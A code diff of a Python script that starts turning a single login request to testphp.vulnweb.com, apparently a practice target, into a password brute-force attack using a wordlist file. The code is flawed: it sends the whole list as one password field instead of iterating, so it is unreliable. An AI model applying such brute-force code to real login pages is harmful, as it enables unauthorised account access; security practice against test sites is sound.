@@ -4,11 +4,15 @@ import requests
 
 target_url = "http://testphp.vulnweb.com/login.php"
 
-data = {
+data_dict = {
     "uname": "test",
-    "pass": "test",
+    "pass": "",
     "login": "submit"
 }
 
-response = requests.post(target_url, data=data)
-print(response.text)
+
+
+with open("password.list", "r") as wordlist_file:
+    words = [line.strip() for line in wordlist_file]
+    data_dict["pass"] = words
+    response = requests.post(target_url, data=data_dict)
